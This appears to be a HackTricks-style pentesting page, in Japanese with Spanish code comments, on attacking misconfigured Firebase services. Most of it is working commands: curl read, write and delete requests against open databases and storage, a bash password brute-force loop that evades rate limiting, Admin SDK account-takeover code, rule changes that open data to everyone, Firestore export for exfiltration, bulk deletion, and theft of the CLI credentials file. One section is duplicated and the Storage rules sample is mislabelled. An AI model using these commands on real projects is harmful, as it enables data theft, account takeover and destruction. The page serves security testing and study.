# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Firebase Realtime Databaseへの未認証アクセス
攻撃者はこの攻撃を実行するために特別なFirebaseの権限を必要としません。必要なのは、Firebase Realtime Databaseのセキュリティルールが脆弱に設定され、`.read: true` または `.write: true` により公開の読み取りまたは書き込みを許可していることだけです。

攻撃者はデータベースのURLを特定する必要があり、通常は次の形式になります: `https://<project-id>.firebaseio.com/`。

このURLは、mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps)、google-services.json (Android) や GoogleService-Info.plist (iOS) といった設定ファイルの解析、webアプリケーションのソースコードの調査、またはネットワークトラフィックを調べて `*.firebaseio.com` ドメインへのリクエストを特定することで見つけられます。

攻撃者はデータベースのURLを特定し、それが公開されているかどうかを確認してからデータにアクセスし、場合によっては悪意のある情報を書き込みます。

まず、URLに .json を追加してデータベースが読み取りを許可しているかを確認します。
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
レスポンスが JSON データまたは null（"Permission Denied" の代わりに）を含む場合、データベースは読み取りアクセスを許可しています。書き込みアクセスを確認するには、攻撃者は Firebase REST API を使ってテスト書き込みリクエストを送信してみることができます。
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
操作が成功した場合、データベースは書き込みアクセスも許可します。


### Cloud Firestore におけるデータの露出
攻撃者はこの攻撃を実行するために特定の Firebase の権限を必要としません。必要なのは、認証なし、または検証が不十分な状態で読み取りまたは書き込みを許可する Cloud Firestore のセキュリティルールに脆弱な設定が存在することだけです。完全なアクセスを付与する誤った設定のルールの例は次のとおりです：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
このルールは、誰でもあらゆる制限なしにすべてのドキュメントを読み書きできるようにします。 Firestore rulesは粒度が細かく、コレクションやドキュメントごとに適用されるため、特定のルールの誤りが一部のコレクションのみを露出する可能性があります。

攻撃者は Firebase Project ID を特定する必要があり、これは mobile app reverse engineering、google-services.json や GoogleService-Info.plist のような設定ファイルの解析、ウェブアプリのソースコードの調査、または firestore.googleapis.com へのリクエストを特定するためのネットワークトラフィック解析などから見つけることができます。  
The Firestore REST API uses the format:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
ルールが認証なしの読み取りアクセスを許可している場合、攻撃者はコレクションとドキュメントを読み取ることができます。まず、特定のコレクションにアクセスしようとします:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
レスポンスが権限エラーではなくJSONドキュメントを含む場合、そのコレクションは公開されています。攻撃者は一般的な名前を試すかアプリケーションの構造を解析することで、アクセス可能なすべてのコレクションを列挙できます。特定のドキュメントにアクセスするには:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
ルールが未認証の書き込みアクセスを許可しているか、バリデーションが不十分な場合、攻撃者は新しいドキュメントを作成できます:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
既存のドキュメントを変更するには PATCH を使用します:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
ドキュメントを削除してサービス拒否を引き起こすには:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storageにおけるファイルの露出
攻撃者はこの攻撃を実行するために特定のFirebase権限を必要としません。必要なのは、Firebase Storageのセキュリティルールに脆弱な設定があり、認証なしまたは検証が不十分な状態でread or write accessを許可していることだけです。Storage rulesはreadとwriteの権限を独立して制御するため、ルールの誤りによりread accessのみ、write accessのみ、あるいは両方が公開される可能性があります。完全なアクセスを許可する誤設定されたルールの例は次のとおりです:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
このルールは、すべてのドキュメントに対して制限なく読み取りおよび書き込みアクセスを許可します。Firestore のルールは細かく、コレクション単位およびドキュメント単位で適用されるため、特定のルールの誤りは一部のコレクションのみが公開される可能性があります。attacker は Firebase Project ID を特定する必要があり、これは mobile application reverse engineering、google-services.json や GoogleService-Info.plist といった設定ファイルの解析、web アプリケーションのソースコードの検査、あるいは firestore.googleapis.com へのリクエストを特定するためのネットワークトラフィック解析などによって見つけられます。
Firestore REST API は次の形式を使用します: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

ルールが unauthenticated 読み取りアクセスを許可している場合、attacker はコレクションやドキュメントを読み取ることができます。まず attacker は特定のコレクションにアクセスを試みます。
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
レスポンスが permission error の代わりにファイル一覧を返す場合、そのファイルは露出しています。attacker はパスを指定することでファイルの内容を閲覧できます：
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
ルールが認証されていない書き込みアクセスを許可しているか、検証が不十分な場合、攻撃者は悪意のあるファイルをアップロードできます。REST API を経由してファイルをアップロードするには:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
攻撃者は code shells、malware payloads、または大きなファイルをアップロードして denial of service を引き起こすことができます。アプリケーションがアップロードされたファイルを処理または実行する場合、攻撃者は remote code execution を達成する可能性があります。ファイルを削除して denial of service を引き起こすには：
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### 公開された Firebase Cloud Functions の呼び出し
攻撃者はこの問題を悪用するために特別な Firebase の権限を必要としません。必要なのは、Cloud Function が認証なしで HTTP 経由で公開されていることだけです。

関数は次のように不適切に構成されていると脆弱になります:

- functions.https.onRequest を使用しており、認証を強制しません（onCall functions と異なり）。
- 関数のコードがユーザー認証を検証していない（例: request.auth や context.auth のチェックがない）。
- 関数が IAM 上で公開されており、allUsers が roles/cloudfunctions.invoker ロールを持っている。これは、開発者がアクセスを制限しない限り、HTTP functions のデフォルトの挙動です。

Firebase HTTP Cloud Functions は次のような URL を通じて公開されます:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

攻撃者はソースコード解析、ネットワークトラフィックの解析、列挙ツール、またはモバイルアプリのリバースエンジニアリングを通じてこれらの URL を発見できます。
関数が公開されていて認証が不要な場合、攻撃者は資格情報なしで直接呼び出すことができます。
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
関数が入力を適切に検証しない場合、攻撃者は code injection や command injection などの他の攻撃を試みる可能性があります。

### 弱いパスワードポリシーを持つ Firebase Authentication に対するブルートフォース攻撃
攻撃を実行するために攻撃者が特別な Firebase 権限を必要とすることはありません。必要なのは、Firebase API Key がモバイルや web アプリケーションで公開されていること、そしてパスワードポリシーがデフォルト以上に厳しく設定されていないことだけです。

攻撃者は Firebase API Key を特定する必要があり、それは mobile app reverse engineering、google-services.json や GoogleService-Info.plist のような設定ファイルの解析、web アプリケーションのソースコードの確認（例: bootstrap.js）、またはネットワークトラフィックの解析によって見つけることができます。

Firebase Authentication の REST API は次のエンドポイントを使用して、email と password で認証します:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`

Email Enumeration Protection が無効になっている場合、API のエラー応答はメールアドレスがシステムに存在するかどうかを示すことがあり（EMAIL_NOT_FOUND と INVALID_PASSWORD の違い）、これにより攻撃者はパスワード推測を試みる前にユーザーを列挙できます。この保護が有効な場合、API は存在しないメールアドレスと誤ったパスワードの両方に対して同じエラーメッセージを返し、ユーザー列挙を防ぎます。

Firebase Authentication は rate limiting を強制することに注意してください。短時間に認証試行が多数行われるとリクエストがブロックされる可能性があります。このため、攻撃者はレート制限を受けないように試行間に遅延を挿入する必要があります。

攻撃者は API Key を特定し、既知のアカウントに対して複数のパスワードで認証試行を行います。Email Enumeration Protection が無効な場合、攻撃者はエラー応答を解析することで既存のユーザーを列挙できます:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
レスポンスに EMAIL_NOT_FOUND が含まれている場合、そのメールはシステムに存在しません。レスポンスに INVALID_PASSWORD が含まれている場合、そのメールは存在しますがパスワードが間違っており、ユーザーが登録されていることが確認できます。一度有効なユーザーが特定されると、攻撃者は brute-force を試みることができます。Firebase Authentication のレート制限機構を回避するため、試行の間に一時停止を入れることが重要です:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
デフォルトのパスワードポリシー（minimum 6 characters、複雑さの要件なし）では、attackerはすべての6文字パスワードの組み合わせを試すことが可能で、これはより厳しいパスワードポリシーと比べて比較的小さな探索空間を意味します。

### Firebase Authentication におけるユーザー管理

この攻撃を実行するために、attackerはFirebase Authenticationに対する特定の権限が必要です。必要な権限は次のとおりです:

- `firebaseauth.users.create` — ユーザーを作成するため
- `firebaseauth.users.update` — 既存ユーザーを変更するため
- `firebaseauth.users.delete` — ユーザーを削除するため
- `firebaseauth.users.get` — ユーザー情報を取得するため
- `firebaseauth.users.sendEmail` — ユーザーへメールを送信するため
- `firebaseauth.users.createSession` — ユーザーセッションを作成するため

これらの権限は `roles/firebaseauth.admin` ロールに含まれており、Firebase Authentication リソースへの完全な読み書きアクセスを付与します。さらに、これらはより上位のロール（例えば roles/firebase.developAdmin（which includes all firebaseauth.* permissions）や roles/firebase.admin（full access to all Firebase services）など）にも含まれます。

Firebase Admin SDK を使用するには、attackerはサービスアカウントの資格情報（JSONファイル）へのアクセスを必要とします。これらの資格情報は、侵害されたシステム、公開されたコードリポジトリ、侵害された CI/CD システム、あるいはこれらの資格情報にアクセスできる開発者アカウントの侵害を通じて見つかる可能性があります。

最初のステップは、サービスアカウントの資格情報を使って Firebase Admin SDK を設定することです。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
被害者のメールアドレスを使って悪意のあるユーザーを作成するため、攻撃者は Firebase Admin SDK を使ってそのメールアドレスで新しいアカウントを生成しようとします。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
既存のユーザーを変更するには、attacker はメールアドレス、確認ステータス、アカウントが無効化されているかどうかなどのフィールドを更新します。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
ユーザーアカウントを削除して denial of service を引き起こすために、攻撃者はそのユーザーを完全に削除するリクエストを発行します。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
attackerは、UIDやemail addressを指定して既存ユーザーの情報を取得することもできます。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
さらに、攻撃者は確認用リンクやパスワードリセットリンクを生成して、ユーザーのパスワードを変更し、そのアカウントにアクセスすることができる。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication におけるユーザー管理
攻撃者はこの攻撃を実行するために特定の Firebase Authentication の権限が必要です。必要な権限は次のとおりです。

- `firebaseauth.users.create` ユーザーを作成するため
- `firebaseauth.users.update` 既存ユーザーを変更するため
- `firebaseauth.users.delete` ユーザーを削除するため
- `firebaseauth.users.get` ユーザー情報を取得するため
- `firebaseauth.users.sendEmail` ユーザーにメールを送信するため
- `firebaseauth.users.createSession` ユーザーセッションを作成するため

これらの権限は roles/firebaseauth.admin ロールに含まれており、Firebase Authentication リソースへの完全な読み書き権限を付与します。また、`roles/firebase.developAdmin`（すべての firebaseauth.* 権限を含む）や `roles/firebase.admin`（すべての Firebase サービスへのフルアクセス）といった上位のロールにも含まれます。

Firebase Admin SDK を使用するには、攻撃者はサービスアカウントの資格情報（JSON ファイル）へのアクセスが必要です。これらは、侵害されたシステム、公開されたコードリポジトリ、侵害された CI/CD 環境、またはこれらの資格情報にアクセスできる開発者アカウントの侵害から入手される可能性があります。

最初のステップは、サービスアカウントの資格情報を使って Firebase Admin SDK を設定することです。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
攻撃者はvictimのemailを使ってmalicious userを作成するため、そのemailで新しいuser accountを作成し、自分のpasswordとprofile informationを割り当てようとします。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
既存のユーザーを変更するには、attacker はメールアドレス、検証ステータス、またはアカウントが無効化されているかどうかといったフィールドを変更します。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
ユーザーアカウントを削除することで—実質的に denial of service を引き起こすことになり—攻撃者はそのユーザーを恒久的に削除するリクエストを発行します。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻撃者は、UID または email アドレスでユーザーの詳細を要求することで、既存ユーザーの情報（UID や email など）を取得することも可能です。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
さらに、攻撃者は verification links や password-reset links を生成し、ユーザーのパスワードを変更してアカウントを掌握することができます。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebaseサービスにおけるセキュリティルールの変更
攻撃者は、サービスに応じてセキュリティルールを変更するための特定の権限が必要です。Cloud Firestore と Firebase Cloud Storage では、ruleset を作成するための `firebaserules.rulesets.create` と、releases をデプロイするための `firebaserules.releases.create` が必要です。これらの権限は `roles/firebaserules.admin` ロール、または `roles/firebase.developAdmin` や `roles/firebase.admin` のような上位ロールに含まれます。Firebase Realtime Database の場合、必要な権限は `firebasedatabase.instances.update` です。

攻撃者は Firebase REST API を使ってセキュリティルールを変更する必要があります。まず、攻撃者は service account credentials を使って access token を取得する必要があります。トークンを取得するには:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Firebase Realtime Database のルールを変更するには:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Cloud Firestore のルールを変更するには、攻撃者は ruleset を作成してからデプロイする必要があります：
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
前のコマンドは projects/<project-id>/rulesets/<ruleset-id> の形式の ruleset 名を返します。新しいバージョンをデプロイするには、リリースを PATCH リクエストで更新する必要があります:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Firebase Cloud Storage のルールを変更するには:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
前のコマンドは projects/<project-id>/rulesets/<ruleset-id> の形式で ruleset 名を返します。新しいバージョンをデプロイするには、release を PATCH リクエストで更新する必要があります:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestoreにおけるデータの持ち出しと操作
Cloud FirestoreはCloud Datastoreと同じインフラおよび権限システムを使用するため、Datastore IAM権限はそのままFirestoreに適用されます。TTLポリシーを操作するには`datastore.indexes.update`権限が必要です。データをエクスポートするには`datastore.databases.export`権限が必要です。データをインポートするには the datastore.databases.import permission is required。大量データ削除を行うには`datastore.databases.bulkDelete`権限が必要です。

バックアップと復元操作では、以下の特定の権限が必要です:

- `datastore.backups.get` と `datastore.backups.list` — 利用可能なバックアップの一覧取得と詳細確認
- `datastore.backups.delete` — バックアップの削除
- `datastore.backups.restoreDatabase` — バックアップからのデータベース復元
- `datastore.backupSchedules.create` と `datastore.backupSchedules.delete` — バックアップスケジュールの管理

TTLポリシーを作成する際、削除対象となるエンティティを識別するためのプロパティを指定します。このTTLプロパティは日付と時刻の型でなければなりません。攻撃者は既存のプロパティを選ぶことも、後で追加する予定のプロパティを指定することもできます。フィールドの値が過去の日付であれば、そのドキュメントは即時削除の対象になります。攻撃者はgcloud CLIを使ってTTLポリシーを操作できます。
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
データをエクスポートしてexfiltrateするには、攻撃者は gcloud CLI を使用できます。
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
悪意のあるデータをインポートするには:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
大量のデータ削除を行い、denial of service を引き起こすために、攻撃者は gcloud Firestore bulk-delete tool を使用してコレクション全体を削除することができる。
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
バックアップおよび復元操作では、攻撃者はスケジュールされたバックアップを作成してデータベースの現在の状態を取得し、既存のバックアップを一覧表示し、バックアップから復元して最近の変更を上書きし、バックアップを削除して恒久的なデータ損失を引き起こし、スケジュールされたバックアップを削除できます。
即時にバックアップを生成する日次バックアップスケジュールを作成するには：
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
特定のバックアップから復元するには、攻撃者はそのバックアップに含まれるデータを使って新しいデータベースを作成できます。復元操作はバックアップのデータを新しいデータベースに書き込むため、既存の DATABASE_ID は使用できません。
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
バックアップを削除して永久的なデータ損失を引き起こすには:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Theft and misuse of Firebase CLI credentials
攻撃者はこの攻撃を実行するために特定のFirebaseの権限を必要としませんが、開発者のローカルシステムまたはFirebase CLI credentials fileへのアクセスは必要です。これらの資格情報は次のJSONファイルに保存されています:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

このファイルには認証トークンが含まれており、refresh_tokenやaccess_tokenを含むため、攻撃者はfirebase loginを実行した元のユーザーとして認証できます。

攻撃者がFirebase CLI credentials fileにアクセスすると、ファイル全体を自分のシステムにコピーし、Firebase CLIはデフォルトの場所から自動的にその資格情報を使用します。その後、攻撃者は当該ユーザーがアクセス可能なすべてのFirebase projectsを閲覧できます。
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
